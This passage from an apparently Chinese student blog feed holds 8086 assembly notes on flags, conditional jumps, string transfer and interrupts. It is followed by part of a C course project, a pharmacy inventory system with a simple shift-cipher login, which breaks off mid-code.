如果(ax)&gt;(bx)则(ax)-(bx)=0不必借位且结果不为0，所以cf=0，zf=0<br>
如果(ax)&lt;=(bx)则(ax)-(bx)=0可能借位，结果可能为0，所以cf=1或zf=1</p>
<p>进行有符号数比较时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp ah,bh</span><br></pre></td></tr></table></figure>
<p>如果(ah)=(bh)则(ah)-(bh)=0，所以zf=1<br>
如果(ah)!=(bh)则(ah)-(bh)!=0，所以zf=0</p>
<p>如果sf=1，of=0，(ah)&lt;(bh)<br>
如果sf=1，of=1，(ah)&gt;(bh)<br>
如果sf=0，of=1，(ah)&lt;(bh)<br>
如果sf=0，of=0，(ah)&gt;=(bh)</p>
<p>of=0，说明没有溢出，逻辑上真正结果的正负=实际结果的正负<br>
如果因为溢出导致了实际结果为负(正)，那么逻辑上真正的结果必然为正(负)</p>
<p>*zf：记录结果是否为0。如果为0那么ZF=1，如果不为0那么ZF=0<br>
*cf：记录了无符号数运算结果的最高有效位向更高位的进位值<br>
*of：记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0。 OF=0,说明逻辑上真正结果的正负=实际结果的正负<br>
*sf： 记录相关指令执行后结果是否为负，如果负sf=1，如果非负sf=0<br>
*pf：记录相关指令执行后结果的所有bit位中 1 的个数是否为偶数，如果为偶数PF=1，如果不为偶数PF=0</p>
<h2 id="检测比较结果的条件转移指令">检测比较结果的条件转移指令</h2>
<p>与call和ret类似，通常和cmp配合使用<br>
检测被cmp影响的，表示比较结果的标志位</p>
<p>根据<strong>无符号数</strong>的比较结果进行转移的条件转移指令检测zf、cf：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令            含义                检测标志位</span><br><span class="line">je             等于则转移            zf=1      </span><br><span class="line">jne          不等于则转移            zf=0                    </span><br><span class="line">jb             低于则转移            cf=1</span><br><span class="line">jnb          不低于则转移            cf=0                   </span><br><span class="line">ja             高于则转移            cf=0&amp;&amp;zf=0     </span><br><span class="line">jna          不高于则转移            cf=1||zf=1 </span><br></pre></td></tr></table></figure>
<p>根据<strong>有符号数</strong>的比较结果进行转移的条件转移指令检测sf、of、zf</p>
<h2 id="DF标志和串传送指令">DF标志和串传送指令</h2>
<p>DF：方向标志位，在串传送指令中，控制每次操作后si、di的增减<br>
df=0，每次操作后si、di递增<br>
df=1，每次操作后si、di递减</p>
<ol>
<li>
<p>movsb<br>
功能：将ds：si指向的内存单元中的<em>字节</em>送入es：di中，然后根据标志寄存器df位的值将si和di递增或递减</p>
</li>
<li>
<p>movsw<br>
功能：将ds：si指向的内存单元中的<em>字</em>送入es：di中，然后根据标志寄存器df位的值将si和di递增2或递减2</p>
</li>
</ol>
<p>一般来说，movsb和movsw都和rep配合使用<br>
格式： rep movsb<br>
功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:movsb</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure>
<p>对df位进行设置的指令：<br>
cld指令：将df位置0<br>
std指令：将df位置1</p>
<p>使用串传送指令进行数据的传送，需要：</p>
<ol>
<li>传送的原始位置：ds：si</li>
<li>传送的目的位置：es：di</li>
<li>传送的长度：cx</li>
<li>传送的方向：df  (正向/反向传送，si、di递增/递减)</li>
</ol>
<h3 id="pushf和popf">pushf和popf</h3>
<p>pushf是将标志寄存器的值压栈<br>
popf是从栈中弹出数据送入标志寄存器中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0 ;ax清零</span><br><span class="line">push ax ;ax入栈</span><br><span class="line">popf ;把栈中数据弹出到PSW。至此，PSW已经被全置为: 0000 0000 0000 0000 B</span><br><span class="line"></span><br><span class="line">mov ax,0fff0h</span><br><span class="line">add ax,0010h</span><br><span class="line"></span><br><span class="line">CF：假设这是无符号运算：FFF0h+0010h = 1111 1111 1111 0000b + 0000 0000 0001 0000b</span><br><span class="line">=(进位1)0000 0000 0000 0000b，产生进位1，CF标志 = 1。</span><br><span class="line"></span><br><span class="line">OF：假设这是有符号运算：FFF0h此处为补码形式，(FFF0h)原 = 1000 0000 0001 0000b。FFF0h+0010h=0，OF标志 = 0</span><br><span class="line"></span><br><span class="line">pushf</span><br><span class="line">pop ax</span><br><span class="line">这两句把 ax的值设置为：(0000 00** 010* 0101)b</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p><em>tips</em>:</p>
<p><strong>正加正得负，或负加负得正，肯定溢出</strong></p>
<p><strong>一个正数和一个负数相加不可能溢出</strong></p>
<h2 id="内中断">内中断</h2>
<p>任何一个cpu都可以在执行完当前正在执行的指令后，检测到从cpu外部发送来的或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理，这种信息称为<strong>中断信息</strong>。</p>
<h3 id="内中断的产生">内中断的产生</h3>
<p>cpu内部有4种情况可以产生需要及时处理的中断信息<br>
处理中断信息首先要知道接收到的信息的来源，所以中断信息中必须包含识别来源的编码。8086cpu用中断类型码来标识中断信息的来源<br>
中断类型码为一个字节型数据，即可以表示256种中断信息的来源（简称中断源）</p>
<ol>
<li>除法错误，如执行div指令产生的除法溢出 中断类型码：0</li>
<li>单步执行 中断类型码：1</li>
<li>执行into指令 中断类型码：4</li>
<li>执行int 指令 指令格式为int n,n为字节型立即数,中断类型码：n</li>
</ol>
<h3 id="中断向量表">中断向量表</h3>
<p>中断处理程序入口地址的列表<br>
cpu用8位的终端类型码，通过中断向量表，找到相应的中断处理程序的入口地址<br>
中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口<br>
cpu知道了中断类型码就可以将中断类型码作为中断向量表的表项号，定位相应的表项，从而得到程序的入口地址<br>
如果使用8086cpu，中断向量表就必须存放在0000：0000~0000：03FF中，一个表项占两个字，高地址存放段地址，低地址字存放偏移地址</p>
<h2 id=""></h2>
<p>*一个字节：8位<br>
*一个字==两个字节</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>课设-药店管理系统</title>
    <url>/13498.html</url>
    <content><![CDATA[<p>（为了避免又发生某种奇怪的错误导致程序突然变成了前几个小时保存的版本，还是做完后把它弄到这来好了）<br>
一个功能简单的管理系统，包含了menu()里的功能以及登录、注册和称不上加密的加密</p>
<p>尝试使用了system(“pause”)、system(“cls”)以及把黑框弄成白框的system(“color 70”)</p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">用于测试数据： </span></span><br><span class="line"><span class="comment">1234 哇 123 处 2000 2029 10</span></span><br><span class="line"><span class="comment">2344 吃 232 非 1234 2099 1</span></span><br><span class="line"><span class="comment">1233 啊 1234 非 2019 2020 2</span></span><br><span class="line"><span class="comment">1239 非 129 处 2001 2021 13</span></span><br><span class="line"><span class="comment">1342 哦哦、 23 处 2011 2022 13</span></span><br><span class="line"><span class="comment">3244 ·· 243 非 2011 2021 2 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">med</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> elecode;<span class="comment">//编码</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];<span class="comment">// 药品名称</span></span><br><span class="line">	<span class="keyword">double</span> price;<span class="comment">//价格</span></span><br><span class="line">	<span class="keyword">char</span> type[<span class="number">5</span>];<span class="comment">// 药品类型</span></span><br><span class="line">	<span class="keyword">int</span> prod;<span class="comment">//生产日期(年)</span></span><br><span class="line">	<span class="keyword">int</span> shelf;<span class="comment">//保质期(年)</span></span><br><span class="line">	<span class="keyword">int</span> stock;<span class="comment">//库存</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span>* <span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;欢迎使用本管理系统\n&quot;</span> </span><br><span class="line">			<span class="string">&quot;选择一项功能:\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;1.录入信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;2.打印信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;3.保存信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;4.读取信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;5.统计药品总数\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;6.查找符合条件的药品\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;7.修改信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;8.删除信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;9.退出\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;color 70&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(user()!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="keyword">switch</span>(n) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//录入</span></span><br><span class="line">				build();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//打印</span></span><br><span class="line">				print(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//保存</span></span><br><span class="line">				save(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//读取</span></span><br><span class="line">				read();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="comment">//统计人数</span></span><br><span class="line">				sum(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="comment">//查找</span></span><br><span class="line">				find(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7</span>:<span class="comment">//修改</span></span><br><span class="line">				modify(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:<span class="comment">//删除</span></span><br><span class="line">				remove();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Wrong num\n&quot;</span>);</span><br><span class="line">				getchar();</span><br><span class="line">				getchar();</span><br><span class="line">				system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;欢迎使用本系统，请先注册或登录：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1.注册/2.登录：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">char</span> id[<span class="number">10</span>],pass[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入:用户名  密码:  (均只能为小于8位的字母或数字)&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s %s&quot;</span>,id,pass);</span><br><span class="line">		FILE* fp;</span><br><span class="line">		fp = fopen(<span class="string">&quot;.\\userinfo.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; id[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">			id[i]+=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; pass[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">			pass[i]+=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s &quot;</span>,id);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s &quot;</span>,pass);</span><br><span class="line">		fclose(fp);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;保存成功\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">2</span>) &#123;</span><br><span class="line">		FILE *fp;</span><br><span class="line">		fp=fopen(<span class="string">&quot;.\\userinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;还未注册过&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;输入用户名: &quot;</span>);</span><br><span class="line">			<span class="keyword">char</span> a[<span class="number">10</span>],b[<span class="number">10</span>];</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; a[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">				a[i]+=<span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;输入密码：&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> g=<span class="number">0</span>; g&lt;<span class="number">10</span>; g++) &#123;</span><br><span class="line">				b[g]=getch();</span><br><span class="line">				<span class="keyword">if</span> (b[g]==<span class="string">&#x27;\x0d&#x27;</span>) &#123;</span><br><span class="line">					b[g]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				b[g]=b[g]+<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,id)==<span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">strcmp</span>(id,a)==<span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,pass);</span><br><span class="line">					<span class="keyword">if</span>(<span class="built_in">strcmp</span>(pass,b)==<span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;正在进入管理系统....&quot;</span>);</span><br><span class="line">						system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">						system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">head</span>=</span><span class="literal">NULL</span>,*nextp;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		head=p;</span><br><span class="line">		<span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;顺序输入药品的：编码  名称 价格 药品类型（处方药/非处方药） 生产日期（年） 保质期（年） 库存，-1结束\n&quot;</span>);</span><br><span class="line">	nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">	nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode);</span><br><span class="line">	<span class="keyword">while</span>(nextp-&gt;elecode!=<span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s %lf %s %d %d %d&quot;</span>,nextp-&gt;name,&amp;nextp-&gt;price,nextp-&gt;type,&amp;nextp-&gt;prod,&amp;nextp-&gt;shelf,&amp;nextp-&gt;stock);</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			head=p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			head-&gt;next=nextp;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;成功录入,按回车返回&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct med *p)</span> </span>&#123;	</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d     %s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		sum+=p-&gt;stock;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;药品种类：%d\n药品总量：%d&quot;</span>,i,sum);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//组合查询：stock&gt;10的</span></span><br><span class="line"><span class="comment">//单项查询：按编码  按价格区间</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;选择查询内容：\n1.库存小于10或可能在一年内过期的药\n2.按编码查询\n3.按价格区间查询\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	<span class="keyword">if</span>(num==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;今年是__年：    &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(p) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;stock&lt;<span class="number">10</span>||p-&gt;shelf-n&lt;<span class="number">2</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d     %s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">				<span class="comment">//printf(&quot;%d %s %lf %s %d %d %d\n&quot;,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span></span><br><span class="line">			p=p-&gt;next; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入编码：   &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;elecode==n) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">			<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong Number\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(num==<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> min,max;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入最低和最高价格，以空格分开：    &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;min,&amp;max);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(p) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;price&gt;=min&amp;&amp;p-&gt;price&lt;=max)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d     %s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;错误的选项\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入修改药品的编码:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;elecode!=num) &#123;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;编码错误&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入修改药品信息:\n&quot;</span>);	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;顺序输入药品的：名称 价格 药品类型（处方药/非处方药） 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s %lf %s %d %d %d&quot;</span>,p-&gt;name,&amp;p-&gt;price,p-&gt;type,&amp;p-&gt;prod,&amp;p-&gt;shelf,&amp;p-&gt;stock);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功修改\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入删除药品编码：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">head</span>,*<span class="title">nextp</span>,*<span class="title">d</span>;</span></span><br><span class="line">	head=p;</span><br><span class="line">	nextp=p;</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;elecode==n) &#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(head);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功删除&quot;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	head=head-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(head) &#123;</span><br><span class="line">			<span 